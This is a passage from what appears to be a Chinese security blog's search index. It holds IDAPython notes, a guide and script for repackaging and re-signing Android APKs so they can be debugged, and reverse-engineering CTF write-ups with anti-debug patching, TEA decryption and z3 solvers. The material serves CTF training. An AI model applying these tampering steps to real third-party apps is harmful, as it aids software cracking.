mcaebacedaabfacacabgagbbaaeacabcbacebagaaabcdbgbdbcbdacgabfbbebababbbbbcaabdababafaccacdagdaababaaaa# L3HCTF&#123;6584ed9fd9497981117f22a6c572caee&#125; flag为 L3HCTF&#123;6584ed9fd9497981117f22a6c572caee&#125; 参考： https://www.anquanke.com/post/id/259494#h3-2","categories":[{"name":"CTF","slug":"CTF","permalink":"https://zzzzsky.github.io/categories/CTF/"}],"tags":[{"name":"图","slug":"图","permalink":"https://zzzzsky.github.io/tags/%E5%9B%BE/"},{"name":"最短路径","slug":"最短路径","permalink":"https://zzzzsky.github.io/tags/%E6%9C%80%E7%9F%AD%E8%B7%AF%E5%BE%84/"}]},{"title":"IDAPython 学习笔记","slug":"LearnIDAPython","date":"2021-12-08T14:12:00.000Z","updated":"2021-12-08T14:22:07.588Z","comments":true,"path":"2021/12/08/LearnIDAPython/","link":"","permalink":"https://zzzzsky.github.io/2021/12/08/LearnIDAPython/","excerpt":"","text":"摘要比着大佬写的文章系统的学习下IDAPython，做下笔记，供自己以后查询 大佬的文章，👇 https://www.cnblogs.com/iBinary/p/14642662.htmlhttps://www.cnblogs.com/iBinary/p/14672540.htmlhttps://www.cnblogs.com/iBinary/p/14801928.html IDAPython参考学习文档 IDAPython官方函数文档： https://www.hex-rays.com/wp-content/static/products/ida/support/idapython_docs/ IDA版本变化后IDAPython对应差异函数查询：https://www.hex-rays.com/products/ida/support/ida74_idapython_no_bc695_porting_guide.shtml IDA中获取界面中地址函数 作用 老版函数 新版函数 获取当前指令地址（光标点击的那个，灰色阴影那行） idc.ScreenEA() idc.get_screen_ea() 整个IDA中的最小地址 idc.MinEA() idc.StartEA() idc.BeginEA() ida_ida.inf_get_min_ea() 整个IDA中的最大地址（其实是最大地址 + 1） idc.MaxEA() ida_ida.inf_get_max_ea() 光标选择块的开始地址 idc.SelStart() idc.read_selection_start() 光标选择块的结束地址（结束地址 + 1） idc.SelEnd() idc.read_selection_end() 数值获取及打补丁操作获取数据在IDA中想要获取某个地址处的数据可以采用以下函数 作用 老版函数 新版函数 获取BYTES类型 ida_bytes.get_many_bytes(addr, len) ida_bytes.get_bytes(addr, len) 获取BYTE类型 idc.Byte(addr) idc.get_wide_byte(addr) 获取WORD类型 idc.Word(addr) idc.get_wide_word(addr) 获取DWORD类型 idc.Dword(addr) idc.get_wide_dword(addr) 获取QWORD类型 idc.Qword(addr) idc.get_qword(addr) Patch打补丁 作用 老版函数 新版函数 打补丁BYTE idc.PatchByte(addr,value) ida_bytes.patch_byte(addr,value) 打补丁WORD idc.PatchWord(addr,value) ida_bytes.patch_word(addr,value) 打补丁DWORD idc.PatchDword(addr,value) ida_bytes.patch_dword(addr,value) 打补丁QWORD idc.PatchQword(addr,value) ida_bytes.patch_qword(addr,value) 汇编相关指令操作 作用 老版函数 新版函数 获取地址处的汇编语句 idc.GetDisasm(addr) 无 更高级的获取.带有标志. 一般是给一个0 idc.GetDisasmEx(addr,flags) idc.generate_disasm_line(addr,flags) 获取指定位置的操作数mov ebp, esp. ebp索引是0，esp索引是1 idc.GetOpnd(addr,index) idc.print_operand(addr,index) 获取地址处汇编指令的操作指令 mov ebp,esp 获取mov idc.GetMnem(addr) idc.print_insn_mnem(addr) 获取基地址 idaapi.get_imagebase() 无 获取操作数的类型 idc.GetOpType(ea,index) idc.get_operand_type(addr,index) call printf； 调用此函数，index填0的话，返回的就是printf的地址。 and esp, 0FFFFFFF8h；index填1的话，返回的就是0xfffffff8 idc.GetOperandValue(addr,index) get_operand_value(addr,index) 获取下一行汇编的地址 idc.NextHead idc.next_head(ea) 获取上一行汇编的地址 idc.PrevHead idc.PrevHead(ea) 段相关操作 作用 老版函数 新版函数 获取段的名字 idc.SegName(addr) idc.get_segm_name(addr) 获取段的开始地址 idc.SegStart(addr) idc.get_segm_start(addr) 获取段的结束地址 idc.SegEnd(addr) idc.get_segm_end(addr) 返回一个列表记录所有段的地址 idautils.Segments() 无 获取第一个段 idc.FirstSeg() idc.get_first_seg() 获取下一个段 参数是当前段的任意地址 返回的是下一个段的地址 idc.NextSeg(addr) idc.get_next_seg(addr) 函数相关操作 作用 老版函数 新版函数 获取指定地址之间的所有函数 Functions(startaddr,endaddr) 无 获取指定地址的函数名 idc.GetFunctionName(addr) idc.get_func_name(addr) 获取函数的注释 idc.GetFunctionCmt get_func_cmt(ea, repeatable) 1是地址 2是0或1 1是获取重复注释 0是获取常规注释 设置函数注释 idc.SetFunctionCmt set_func_cmt(ea, cmt, repeatable) 弹框让用户选择函数，返回的是函数的地址 idc.ChooseFunction(title) idc.choose_func(title) 返回: addr 距离函数的偏移形式 idc.GetFuncOffset(addr) idc.get_func_off_str(addr) 寻找函数结尾,如果函数存在则返回结尾地址,否则返回-1 idc.FindFuncEnd(addr) idc.find_func_end(addr) 设置函数结尾 ida_funcs.func_setstart(addr,newstartaddr) ida_funcs.set_func_start(addr, newstart) 设置函数开头 ida_funcs.func_setstart(addr,newstartaddr) ida_funcs.set_func_start(addr, newstart) 设置地址处的名字 idc.MakeName(addr, name) 与之同名了还有Ex函数 idc.set_name(ea, name, SN_CHECK) Ex函数也使用set_name 获取前一个函数的地址 idc.PrevFunction idc.get_prev_func(ea) 获取下一个函数的地址 idc.NextFunction idc.get_next_func 搜索功能搜索 作用 老版函数 新版函数 查找二进制找到返回地址没找到返回-1(BADADDR) idc.FindBinary idc.find_binary(ea, flag, searchstr, radix=16, from_bc695=False) 返回data的地址，而不是code（注意不是指具体的数据，而是指的data类型） idc.FindData idc.find_data 或者ida_search.find_data 返回code的地址，而不是data idc.FindCode idc.find_code 可以使用 ida_search.find_code 也可以使用 跳转到ea位置 idc.Jump ida_kernwin.jumpto(ea) 校验数据校验函数is_xxxx传入的都是flag，因为需要先获取某个地址处的flag，然后再将获取的flag传入is_xxxx 作用 老版函数 新版函数 获取标志 idc.GetFlags(ea) ida_bytes.get_full_flags(ea) 判断是否是代码，传入标志，根据标志返回True or False idc.isCode(f) ida_bytes.is_code(f) 同上 只不过是判断是否是数据 idc.isData(f) ida_bytes.is_data(f)","categories":[{"name":"工具","slug":"工具","permalink":"https://zzzzsky.github.io/categories/%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"IDAPython","slug":"IDAPython","permalink":"https://zzzzsky.github.io/tags/IDAPython/"},{"name":"IDA","slug":"IDA","permalink":"https://zzzzsky.github.io/tags/IDA/"}]},{"title":"2道CTF_APK题不能调试的解决方法及引发的思考","slug":"安卓重新签名打包调试","date":"2021-12-04T14:02:00.000Z","updated":"2021-12-05T12:02:16.016Z","comments":true,"path":"2021/12/04/安卓重新签名打包调试/","link":"","permalink":"https://zzzzsky.github.io/2021/12/04/%E5%AE%89%E5%8D%93%E9%87%8D%E6%96%B0%E7%AD%BE%E5%90%8D%E6%89%93%E5%8C%85%E8%B0%83%E8%AF%95/","excerpt":"","text":"2道CTF_APK题不能调试的解决方法及引发的思考前言最近找到2个安卓题目来练习，分析后发现如果可以调试的话会大大降低难度（一道是JEB调试，一道是IDA调试so文件），于是我用工具开始调试，发现都没有办法调试，经过各种查阅资料终于可以调试了，于是写下此文，记录下环境配置。 链接：https://pan.baidu.com/s/1nYwqxmipw_marYN6wKJjAg 提取码：9rxq 题目:CTF_2.apk遇到问题JEB调试APK的时候, 先adb shell， 然后查看进程ID，为4546 123beyond1q:/ # ps | grep &quot;ctf&quot;ps | grep &quot;ctf&quot;u0_a44 4546 1876 964728 83108 d772dcc0 S com.example.ctf 打开JEB附加 没法调试，下面开始解决 解决问题打开Manifest ，发现并没有android:debuggable=&quot;true&quot; 先解包 apktool.bat d CTF_2_.apk 于是用加上后用重新打包 apktool.bat b CTF_2_， 新生成的APK文件在 CTF_2_\\dist中, 这个时候如果直接安装的话会报错 1234C:\\Users\\ZSKY\\Desktop\\新建文件夹\\CTF_2\\CTF_2_\\distλ adb install CTF_2_.apk4685 KB/s (3004999 bytes in 0.626s)Failure [INSTALL_PARSE_FAILED_NO_CERTIFICATES: Failed to collect certificates from /data/app/vmdl625528294.tmp/base.apk: Attempt to get length of null array] 还需要签名才可以 123456789101112131415161718C:\\Users\\ZSKY\\Desktop\\新建文件夹\\CTF_2 λ keytool -genkey -keystore coolapk.keystore -keyalg RSA -validity 10000 -alias coolapk 输入密钥库口令: #123456 再次输入新口令: #123456 您的名字与姓氏是什么? [Unknown]: 您的组织单位名称是什么? [Unknown]: 您的组织名称是什么? [Unknown]: 您所在的城市或区域名称是什么? [Unknown]: 您所在的省/市/自治区名称是什么? [Unknown]: 该单位的双字母国家/地区代码是什么? [Unknown]: CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown是否正确? [否]: y 生成签名文件命令: keytool -genkey -keystore 签名文件的文件名 -keyalg RSA -validity 10000 -alias 签名文件别名 这个时候会生成coolapk.keystore签名文件, 然后运行 jarsigner.exe -verbose -keystore coolapk.keystore -storepass 123456 -signedjar CTF_2_new_sign.apk -digestalg SHA1 -sigalg MD5withRSA CTF_2_new.apk coolapk 即可签名 给APK添加签名命令: jarsigner.exe -verbose -keystore coolapk.keystore -storepass 密码 -signedjar 新的APK文件名 -digestalg SHA1 -sigalg MD5withRSA 需要签名的APK文件名 签名文件的别名 这个时候，把之前的安装好的APK删除，然后运行adb install CTF_2_new_sign.apk即可安装成功 再用JEB调试的时候，这里会多一个D标志 下断点输入FLAG，程序就会断下了 题目:CTF_4.apk遇到问题IDA在 检测flag的函数那里下断点，手机输入flag后点注册按钮，IDA总是断不下来，然后下断点的话是橘黄色，后来查阅资料发现是基址的问题，这里libnative-lib.so 文件加载的基址居然是0 IDA如何调试安卓so文件可以参考: https://zzzzsky.com/2021/11/29/IDA%E7%9C%9F%E6%9C%BA%E8%B0%83%E8%AF%95%E5%AE%89%E5%8D%93so%E6%96%87%E4%BB%B6/ 解决问题1、尝试去找加载该so文件的基址然后手动修复 根本找不到该so文件。 2、用CTF_2那个方法把android:debuggable=&quot;true&quot;加上，然后重新打包签名，然后adb install CTF_4.apk的时候遇到了错误 经查阅，此错误是android:extractNativeLibs=&quot;false&quot;的缘故，改为android:extractNativeLibs=&quot;true&quot;即可，我们即加上android:debuggable=&quot;true&quot; 也设置android:extractNativeLibs=&quot;true&quot;重新签名打包，发现可以调试 思考在上一步解决问题之后，还是查看maps文件看基值，当点击注册按钮之后，发现可以发现加载了这个so文件，并且前面有基址，估计是android:extractNativeLibs=&quot;true&quot;的原因 我想测试，如果仅仅设置android:extractNativeLibs=&quot;true&quot; 而 android:debuggable=&quot;false&quot;不变的情况下，能不能通过手动的修复基址来达到IDA调试so的目的，开始测试，android:extractNativeLibs=&quot;true&quot; android:debuggable=&quot;false&quot; 重新打包签名，然后安装, 手机运行CTF_4， 然后查看maps文件有没有加载那个so文件 可以发现，果然加载了,然后准备调试，手机点击注册按钮，IDA弹出 点击same，然后在断点那里断下，不需要修复基址 所以，如果仅仅是IDA调试so的话，不需要JEB调试的话，根本不需要设置android:debuggable=&quot;true&quot;,但是必须得android:extractNativeLibs=&quot;true&quot; 并且这里这个android:extractNativeLibs 如果设置为true或false，感觉有点像PE的那个静态库和动态库 半自动脚本写了个半自动脚本，自动加debug属性，然后重新打包签名，环境为python3.8 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970import sysimport subprocessimport osfrom xml.dom.minidom import parse# 1、先解包APK# 2、打开xml文件分析，android:debuggable 和 android:extractNativeLibs属性# 3、如果没有android:debuggable,则可以加入并且设置为属性为 true# 4、如果有android:debuggable， 则直接设置为true# 5、如果没有android:extractNativeLibs 则不管，如果有且为false，则改为true# 6、apktool重新打包# 7、生成签名文件# 8、将签名加入到apk中def handle_xml(): # 3,4,5 处理XML文件并写回 # AndroidManifest.xml dom = parse(&quot;AndroidManifest.xml&quot;) data = dom.documentElement # android:extractNativeLibs=&quot;true&quot; # android:debuggable=&quot;true&quot; application = data.getElementsByTagName(&quot;application&quot;) print(&quot;[+] 正在修改 android:debuggable 属性&quot;) application[0].setAttribute(&quot;android:debuggable&quot;, &quot;true&quot;) if application[0].getAttribute(&quot;android:extractNativeLibs&quot;) == &#x27;false&#x27;: print(&quot;[+] 正在修改android:extractNativeLibs 属性&quot;) application[0].setAttribute(&quot;android:extractNativeLibs&quot;, &quot;true&quot;) f = open(&quot;AndroidManifest.xml&quot;, &#x27;w&#x27;) dom.writexml(f, encoding=&quot;utf-8&quot;) f.close() with open(&quot;AndroidManifest.xml&quot;, &quot;r&quot;, encoding=&quot;utf-8&quot;) as f: c = f.read() c = c.replace(&#x27;encoding=&quot;utf-8&quot;&#x27;, &#x27;encoding=&quot;utf-8&quot; standalone=&quot;no&quot;&#x27;) f.close() with open(&quot;AndroidManifest.xml&quot;, &quot;w&quot;, encoding=&quot;utf-8&quot;)as f: f.write(c)if __name__ == &quot;__main__&quot;: if len(sys.argv) != 2: print(&quot;[X] 格式有错! python后跟apk名字&quot;) sys.exit(-1) apkpath = sys.argv[1] apkname = os.path.splitext(apkpath)[0] apkdirpath = apkname + &quot;_DIR&quot; # 1、解包APK print(&quot;[+] 解包APK文件&quot;) subprocess.run([&#x27;apktool.bat&#x27;, &#x27;d&#x27;, apkpath, &quot;-o&quot;, apkdirpath]) os.chdir(apkdirpath) # 2、打开xml文件 print(&quot;[+] 当前工作路径为: &quot; + os.getcwd()) handle_xml() print(&quot;[+] 修改XML文件成功&quot;) # 6、重新打包为APK os.chdir(&#x27;../&#x27;) print(&quot;[+] 重新打包APK文件&quot;) print(&quot;[+] 当前工作路径为: &quot; + os.getcwd()) apkpath_new = apkname + &quot;_new.apk&quot; subprocess.run([&#x27;apktool.bat&#x27;, &#x27;b&#x27;, apkdirpath, &quot;-o&quot;, apkpath_new]) # 7、生成签名文件 print(&quot;[+] 密码请输入123456，否则会出错&quot;) # keytool -genkey -keystore 签名文件的文件名 -keyalg RSA -validity 10000 -alias 签名文件别名 subprocess.run([&#x27;keytool&#x27;, &#x27;-genkey&#x27;, &#x27;-keystore&#x27;, apkname + &quot;_new.keystore&quot;, &#x27;-keyalg&#x27;, &#x27;RSA&#x27;, &#x27;-validity&#x27;, &#x27;10000&#x27;, &#x27;-alias&#x27;, apkname]) # 8、给APK文件添加签名 print(f&quot;[+] 给&#123;apkname&#125;_new.apk添加签名&quot;) subprocess.run([&#x27;jarsigner.exe&#x27;, &#x27;-verbose&#x27;, &#x27;-keystore&#x27;, apkname + &quot;_new.keystore&quot;, &#x27;-storepass&#x27;, &#x27;123456&#x27;, &#x27;-signedjar&#x27;, apkname + &#x27;_new_sign.apk&#x27;, &#x27;-digestalg&#x27;, &#x27;SHA1&#x27;, &#x27;-sigalg&#x27;, &#x27;MD5withRSA&#x27;, apkname + &quot;_new.apk&quot;, apkname]) 总结 如果是JEB调试，必须设置android:debuggable=&quot;true&quot; 如果不用JEB，仅仅是IDA调试so文件，不用必须设置android:debuggable=&quot;true&quot;, 但是必须得设置android:extractNativeLibs=&quot;true&quot; 参考文章 https://www.jianshu.com/p/eb766d2bb837 https://www.jianshu.com/p/879d53256ff3","categories":[{"name":"安卓","slug":"安卓","permalink":"https://zzzzsky.github.io/categories/%E5%AE%89%E5%8D%93/"}],"tags":[{"name":"debug","slug":"debug","permalink":"https://zzzzsky.github.io/tags/debug/"}]},{"title":"Python 常用数据类型转换","slug":"python处理数据类型","date":"2021-12-03T09:46:00.000Z","updated":"2021-12-03T09:47:22.856Z","comments":true,"path":"2021/12/03/python处理数据类型/","link":"","permalink":"https://zzzzsky.github.io/2021/12/03/python%E5%A4%84%E7%90%86%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/","excerpt":"","text":"Python 常用数据类型转换在CTF中，经常需要各种数据类型之间的转换 struct模块 官方文档: https://docs.python.org/zh-cn/3.10/library/struct.html C语言数据结构与python bytes之间的转换 ​ 12345678910111213141516171819In [1]: import struct In [2]: struct.pack(&quot;&lt;LLLL&quot;, 1,2,3,4) Out[2]: b&#x27;\\x01\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x04\\x00\\x00\\x00&#x27; In [3]: struct.pack(&quot;&lt;LLLL&quot;,&#x27;a&#x27;,2,3,4) --------------------------------------------------------------------------- error Traceback (most recent call last) &lt;ipython-input-3-e0808e208379&gt; in &lt;module&gt; ----&gt; 1 struct.pack(&quot;&lt;LLLL&quot;,&#x27;a&#x27;,2,3,4) error: required argument is not an integer In [4]: c = struct.pack(&#x27;&lt;I&#x27;, ord(&#x27;a&#x27;)) In [5]: b = struct.unpack(&#x27;&lt;I&#x27;, c) In [6]: b[0] Out[6]: 97 binascii模块二进制和ASCII之间的转换 官方文档: https://docs.python.org/zh-cn/3.7/library/binascii.html 12345678910111213141516In [1]: import binasciiIn [2]: binascii.hexlify(b&#x27;12345&#x27;)Out[2]: b&#x27;3132333435&#x27;In [3]: binascii.hexlify(b&#x27;12345&#x27;, &#x27;-&#x27;)Out[3]: b&#x27;31-32-33-34-35&#x27;In [4]: binascii.unhexlify(b&#x27;3132333435&#x27;)Out[4]: b&#x27;12345&#x27;In [5]: binascii.crc32(b&#x27;123&#x27;)Out[5]: 2286445522In [6]: hex(binascii.crc32(b&#x27;123&#x27;))Out[6]: &#x27;0x884863d2&#x27; 进制之间的转换1234567891011121314151617In [7]: int(0x12)Out[7]: 18In [8]: int(&#x27;23&#x27;)Out[8]: 23In [9]: int(&#x27;1111&#x27;, 2)Out[9]: 15In [10]: int(&#x27;11&#x27;, 16)Out[10]: 17In [11]: bin(123)Out[11]: &#x27;0b1111011&#x27;In [12]: int(&#x27;1111011&#x27;, 2)Out[12]: 123 bytes和数字之间的转换1234567891011121314151617181920212223In [17]: from Crypto.Util.number import long_to_bytes, bytes_to_longIn [18]: bytes_to_long(b&#x27;flag&#x27;)Out[18]: 1718378855In [19]: hex(1718378855)Out[19]: &#x27;0x666c6167&#x27;In [20]: from binascii import *In [21]: unhexlify(1718378855)---------------------------------------------------------------------------TypeError Traceback (most recent call last)&lt;ipython-input-21-43c0727e7de8&gt; in &lt;module&gt;----&gt; 1 unhexlify(1718378855)TypeError: argument should be bytes, buffer or ASCII string, not &#x27;int&#x27;In [22]: unhexlify(&#x27;666c6167&#x27;)Out[22]: b&#x27;flag&#x27;In [23]: long_to_bytes(1718378855)Out[23]: b&#x27;flag&#x27; 列表和bytes,str类型转换1234567891011121314151617In [28]: a = b&#x27;flag&#x27;In [29]: b = list(a)In [30]: bOut[30]: [102, 108, 97, 103]In [31]: bytes(b)Out[31]: b&#x27;flag&#x27; In [36]: a = list(&quot;flag&quot;)In [37]: aOut[37]: [&#x27;f&#x27;, &#x27;l&#x27;, &#x27;a&#x27;, &#x27;g&#x27;]In [38]: &quot;&quot;.join(a)Out[38]: &#x27;flag&#x27;","categories":[{"name":"python","slug":"python","permalink":"https://zzzzsky.github.io/categories/python/"}],"tags":[{"name":"struct","slug":"struct","permalink":"https://zzzzsky.github.io/tags/struct/"}]},{"title":"2021西湖论剑_RE_WP","slug":"2021西湖论剑_RE_WP","date":"2021-12-02T12:37:00.000Z","updated":"2021-12-02T12:37:36.844Z","comments":true,"path":"2021/12/02/2021西湖论剑_RE_WP/","link":"","permalink":"https://zzzzsky.github.io/2021/12/02/2021%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91_RE_WP/","excerpt":"","text":"2021西湖论剑_RE_WPTacticalArmedIDA打开发现有TLS回调函数，如果没有调试就初始化4个值 直接patch，强制jmp到4010F1的位置 第50行，v21那里是每次执行的指令 写OD脚本，在004014A3和 40146D位置下断点，OD运行脚本，打印出下图中一轮来 12345678910111213141516var fvar xmov f,&quot;C:\\\\Users\\\\ZSKY\\\\Desktop\\\\xihulunjian\\\\log.txt&quot;vv:RUNcmp eip,004014A3je stopcmp eip,40146Djnz vvstiopcode eipeval &quot;&#123;eip&#125; : &#123;$RESULT_1&#125;&quot;wrta f,$RESULTjmp vvstop:pause 1234567891011121314151617181920212223242526272829303132335AC720 : mov ecx,dword ptr ds:[0x405748]5AC720 : sub ecx,0x7E5A96D25AC720 : mov dword ptr ds:[0x405748],ecx5AC720 : mov edx,dword ptr ds:[0x40564C]5AC720 : shr edx,0x55AC720 : mov eax,dword ptr ds:[0x405004]5AC720 : add eax,edx5AC720 : mov ecx,dword ptr ds:[0x405748]5AC720 : add ecx,dword ptr ds:[0x40564C]5AC720 : xor eax,ecx5AC720 : mov edx,dword ptr ds:[0x40564C]5AC720 : shl edx,0x45AC720 : mov ecx,dword ptr ds:[0x405000]5AC720 : add ecx,edx5AC720 : xor eax,ecx5AC720 : mov edx,dword ptr ds:[0x405648]5AC720 : add edx,eax5AC720 : mov dword ptr ds:[0x405648],edx5AC720 : mov eax,dword ptr ds:[0x405648]5AC720 : shr eax,0x55AC720 : mov ecx,dword ptr ds:[0x40500C]5AC720 : add ecx,eax5AC720 : mov edx,dword ptr ds:[0x405748]5AC720 : add edx,dword ptr ds:[0x405648]5AC720 : xor ecx,edx5AC720 : mov eax,dword ptr ds:[0x405648]5AC720 : shl eax,0x45AC720 : mov edx,dword ptr ds:[0x405008]5AC720 : add edx,eax5AC720 : xor ecx,edx5AC720 : mov eax,dword ptr ds:[0x40564C]5AC720 : add eax,ecx5AC720 : mov dword ptr ds:[0x40564C],eax 在IDA中随便找个地方patch下上面汇编，然后F5 稍微整理整理 这不就是tea结构吗，只不过delta换了，然后循环变为了33轮,提取出数据写脚本即可 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;unsigned char enc_flag[] = &#123; 0xED, 0x1D, 0x2F, 0x42, 0x72, 0xE4, 0x85, 0x14, 0xD5, 0x78, 0x55, 0x03, 0xA2, 0x80, 0x6B, 0xBF, 0x45, 0x72, 0xD7, 0x97, 0xD1, 0x75, 0xAE, 0x2D, 0x63, 0xA9, 0x5F, 0x66, 0x74, 0x6D, 0x2E, 0x29, 0xC1, 0xFC, 0x95, 0x97, 0xE9, 0xC8, 0xB5, 0x0B, 0&#125;;uint32_t key[] = &#123; 0x7CE45630, 0x58334908, 0x66398867, 0x0C35195B1&#125;;void decrypt(uint32_t *v, uint32_t *k, uint32_t *pSum)&#123; uint32_t v0 = v[0], v1 = v[1], i; uint32_t delta = 0x7E5A96D2; uint32_t k0 = k[0], k1 = k[1], k2 = k[2], k3 = k[3]; for (i = 0; i &lt; 33; i++) &#123; v1 -= ((v0 &lt;&lt; 4) + k2) ^ (v0 + *pSum) ^ ((v0 &gt;&gt; 5) + k3); v0 -= ((v1 &lt;&lt; 4) + k0) ^ (v1 + *pSum) ^ ((v1 &gt;&gt; 5) + k1); *pSum += delta; &#125; v[0] = v0; v[1] = v1;&#125;int main()&#123; unsigned sum = 0; for (int i = 0; i &lt; 33 * 5; i++) &#123; sum -= 0x7E5A96D2; &#125; uint32_t *pFlag = (uint32_t *)enc_flag; for (int i = 0; i &lt; 5; i++) &#123; decrypt(pFlag + (4 - i) * 2, key, &amp;sum); &#125; printf(&quot;%s&quot;, pFlag); return 0;&#125;# kgD1ogB2yGa2roiAeXiG8_aqnLzCJ_rFHSPrn55K flag为 kgD1ogB2yGa2roiAeXiG8_aqnLzCJ_rFHSPrn55K gghdlIDA打开程序 直接F5分析一波 case 0是输入flag，case 5是验证flag是否正确，case 6是对flag中的每个字符进行加密，case 7是将加密后的每个字符后的数据与程序中生成的数据比较 调试起来 加密后v127指向的值为 2, 3, 2, 2, 2, 2, 2, 3 ， 而ord(‘A’) = 0x41, 二进制为 01000001 也就是把2换为0， 把3换为1 然后运行来到case 7的位置 v126的值为3, 3, 2, 3, 3, 3, 2, 3 转为二进制 0b11011101 1234Python&gt;0b110111010xddPython&gt;0xdd ^ ord(&#x27;A&#x27;)0x9c 然后下面的同理，发现全都是xor 0x9c, 一步步调试将对比的数据v123提取出来，然后3变为1，2变为0，转为2进制，再xor 0x9c即为flag 1234567enc = [0b11011000, 0b11011101, 0b11001111, 0b11011111, 0b11001000, 0b11011010, 0b11100111, 0b10101100, 0b10101010, 0b10101110, 0b10100101, 0b10101101, 0b10100101, 0b10101010, 0b10101110, 0b10110001, 0b11111101, 0b11111110, 0b11111101, 0b11111000, 0b10110001, 0b10101000, 0b10101100, 0b11111111, 0b10100100, 0b10110001, 0b10100100, 0b10101111, 0b10101101, 0b10100100, 0b10110001, 0b11111010, 0b10101100, 0b11111101, 0b10101010, 0b11111110, 0b10101101, 0b10100100, 0b10101010, 0b10101000, 0b10100100, 0b10101110, 0b11111111, 0b11100001]flag = [chr(i ^ 0x9c) for i in enc]print(&quot;&quot;.join(flag))# DASCTF&#123;06291962-abad-40c8-8318-f0a6b186482c&#125; 验证下 flag正确，flag为 DASCTF&#123;06291962-abad-40c8-8318-f0a6b186482c&#125; RORIDA打开分析 先找出byte_405000的索引，然后Z3解即可 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667from z3 import *ENC_FLAG = [0x65, 0x55, 0x24, 0x36, 0x9D, 0x71, 0xB8, 0xC8, 0x65, 0xFB, 0x87, 0x7F, 0x9A, 0x9C, 0xB1, 0xDF, 0x65, 0x8F, 0x9D, 0x39, 0x8F, 0x11, 0xF6, 0x8E, 0x65, 0x42, 0xDA, 0xB4, 0x8C, 0x39, 0xFB, 0x99, 0x65, 0x48, 0x6A, 0xCA, 0x63, 0xE7, 0xA4, 0x79]byte_405000 = [0x65, 0x08, 0xF7, 0x12, 0xBC, 0xC3, 0xCF, 0xB8, 0x83, 0x7B, 0x02, 0xD5, 0x34, 0xBD, 0x9F, 0x33, 0x77, 0x76, 0xD4, 0xD7, 0xEB, 0x90, 0x89, 0x5E, 0x54, 0x01, 0x7D, 0xF4, 0x11, 0xFF, 0x99, 0x49, 0xAD, 0x57, 0x46, 0x67, 0x2A, 0x9D, 0x7F, 0xD2, 0xE1, 0x21, 0x8B, 0x1D, 0x5A, 0x91, 0x38, 0x94, 0xF9, 0x0C, 0x00, 0xCA, 0xE8, 0xCB, 0x5F, 0x19, 0xF6, 0xF0, 0x3C, 0xDE, 0xDA, 0xEA, 0x9C, 0x14, 0x75, 0xA4, 0x0D, 0x25, 0x58, 0xFC, 0x44, 0x86, 0x05, 0x6B, 0x43, 0x9A, 0x6D, 0xD1, 0x63, 0x98, 0x68, 0x2D, 0x52, 0x3D, 0xDD, 0x88, 0xD6, 0xD0, 0xA2, 0xED, 0xA5, 0x3B, 0x45, 0x3E, 0xF2, 0x22, 0x06, 0xF3, 0x1A, 0xA8, 0x09, 0xDC, 0x7C, 0x4B, 0x5C, 0x1E, 0xA1, 0xB0, 0x71, 0x04, 0xE2, 0x9B, 0xB7, 0x10, 0x4E, 0x16, 0x23, 0x82, 0x56, 0xD8, 0x61, 0xB4, 0x24, 0x7E, 0x87, 0xF8, 0x0A, 0x13, 0xE3, 0xE4, 0xE6, 0x1C, 0x35, 0x2C, 0xB1, 0xEC, 0x93, 0x66, 0x03, 0xA9, 0x95, 0xBB, 0xD3, 0x51, 0x39, 0xE7, 0xC9, 0xCE, 0x29, 0x72, 0x47, 0x6C, 0x70, 0x15, 0xDF, 0xD9, 0x17, 0x74, 0x3F, 0x62, 0xCD, 0x41, 0x07, 0x73, 0x53, 0x85, 0x31, 0x8A, 0x30, 0xAA, 0xAC, 0x2E, 0xA3, 0x50, 0x7A, 0xB5, 0x8E, 0x69, 0x1F, 0x6A, 0x97, 0x55, 0x3A, 0xB2, 0x59, 0xAB, 0xE0, 0x28, 0xC0, 0xB3, 0xBE, 0xCC, 0xC6, 0x2B, 0x5B, 0x92, 0xEE, 0x60, 0x20, 0x84, 0x4D, 0x0F, 0x26, 0x4A, 0x48, 0x0B, 0x36, 0x80, 0x5D, 0x6F, 0x4C, 0xB9, 0x81, 0x96, 0x32, 0xFD, 0x40, 0x8D, 0x27, 0xC1, 0x78, 0x4F, 0x79, 0xC8, 0x0E, 0x8C, 0xE5, 0x9E, 0xAE, 0xBF, 0xEF, 0x42, 0xC5, 0xAF, 0xA0, 0xC2, 0xFA, 0xC7, 0xB6, 0xDB, 0x18, 0xC4, 0xA6, 0xFE, 0xE9, 0xF5, 0x6E, 0x64, 0x2F, 0xF1, 0x1B, 0xFB, 0xBA, 0xA7, 0x37, 0x8F]indexs = []for i in range(len(ENC_FLAG)): indexs.append(byte_405000.index(ENC_FLAG[i]))v6 = [0] * 8v6[0] = 128v6[1] = 64v6[2] = 32v6[3] = 16v6[4] = 8v6[5] = 4v6[6] = 2v6[7] = 1flag = [BitVec(&quot;flag%d&quot; % i, 8) for i in range(40)]s = Solver()for i in range(0, 40, 8): for j in range(8): v5 = ((v6[j] &amp; flag[i + 3]) &lt;&lt; (8 - (3 - j) % 8)) | ((v6[j] &amp; flag[i + 3]) &gt;&gt; ((3 - j) % 8)) | ((v6[j] &amp; flag[i + 2]) &lt;&lt; (8 - (2 - j) % 8)) | ((v6[j] &amp; flag[i + 2]) &gt;&gt; ((2 - j) % 8)) | ((v6[j] &amp; flag[i + 1]) &lt;&lt; (8 - (1 - j) % 8)) | ((v6[j] &amp; flag[i + 1]) &gt;&gt; ((1 - j) % 8)) | ((v6[j] &amp; flag[i]) &lt;&lt; (8 - -j % 8)) | ((v6[j] &amp; flag[i]) &gt;&gt; (-j % 8)) index = ((v6[j] &amp; flag[i + 7]) &lt;&lt; (8 - (7 - j) % 8)) | ((v6[j] &amp; flag[i + 7]) &gt;&gt; ((7 - j) % 8)) | ((v6[j] &amp; flag[i + 6]) &lt;&lt; (8 - (6 - j) % 8)) | ((v6[j] &amp; flag[i + 6]) &gt;&gt; ((6 - j) % 8) ) | ((v6[j] &amp; flag[i + 5]) &lt;&lt; (8 - (5 - j) % 8)) | ((v6[j] &amp; flag[i + 5]) &gt;&gt; ((5 - j) % 